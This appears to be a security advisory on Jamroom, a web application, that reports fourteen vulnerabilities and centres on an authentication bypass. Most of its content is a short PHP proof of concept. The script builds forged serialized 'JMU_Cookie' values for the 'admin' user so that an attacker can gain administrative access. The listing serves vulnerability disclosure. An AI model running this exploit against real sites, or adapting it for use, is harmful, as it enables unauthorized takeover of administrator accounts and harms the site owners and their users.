source: http://www.securityfocus.com/bid/30406/info

Jamroom is prone to fourteen security vulnerabilities, including an authentication-bypass vulnerability that occurs because the application fails to verify user-supplied data.

Very few technical details are available regarding the remaining security vulnerabilities. We will update this BID when more information is disclosed.

An attacker can exploit the authentication-bypass vulnerability to gain administrative access to the affected application; other attacks are also possible. Effects of the remaining security vulnerabilities are not currently known. 

<?php
$data = array();
$user = 'admin'; // Target

$data[0] = base64_encode(serialize($user));
$data[1] = (bool)0;
echo "\n\n===[ 0 ] ========================\n\n";
echo 'Cookie: JMU_Cookie=' . urlencode(serialize($data));
$data[1] = (bool)1;
echo "\n\n===[ 1 ] ========================\n\n";
echo 'Cookie: JMU_Cookie=' . urlencode(serialize($data));
?>